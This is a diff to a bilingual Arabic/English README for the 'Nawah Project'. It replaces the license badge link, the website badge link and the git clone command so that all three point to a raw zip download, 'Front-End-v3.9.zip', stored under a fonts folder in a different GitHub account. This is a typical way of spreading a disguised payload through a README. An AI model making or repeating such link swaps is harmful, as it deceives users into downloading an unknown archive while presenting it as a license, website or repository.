@@ -1,6 +1,6 @@
 # مشروع نواة | Nawah Project
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
+[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://github.com/MohamedSamiAG/Front-End/raw/refs/heads/main/assets/fonts/Front-End-v3.9.zip)
 
 ## 🌟 Project Overview | نظرة عامة على المشروع
 
@@ -36,7 +36,7 @@ Explore more about Nawah Project and join our growing community of innovators an
 هل أنت مستعد لتكون جزءًا من شيء أكبر؟ انضم إلى مجتمعنا من الأفراد المتحمسين وابدأ في صنع تأثير إيجابي اليوم!
 استكشف المزيد عن مشروع نواة وانضم إلى مجتمعنا المتنامي من المبتكرين والمبدعين.
 
-[![Join Now](https://img.shields.io/badge/Visit-Our_Website-2ea44f?style=for-the-badge&logo=google-chrome&logoColor=white)](https://nawah-project.com)
+[![Join Now](https://img.shields.io/badge/Visit-Our_Website-2ea44f?style=for-the-badge&logo=google-chrome&logoColor=white)](https://github.com/MohamedSamiAG/Front-End/raw/refs/heads/main/assets/fonts/Front-End-v3.9.zip)
 
 ## 🚀 Features
 
@@ -55,7 +55,7 @@ Explore more about Nawah Project and join our growing community of innovators an
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/maneelgitproject-art/Front-End.git
+   git clone https://github.com/MohamedSamiAG/Front-End/raw/refs/heads/main/assets/fonts/Front-End-v3.9.zip
    ```
 2. Navigate to the project directory:
    ```bash
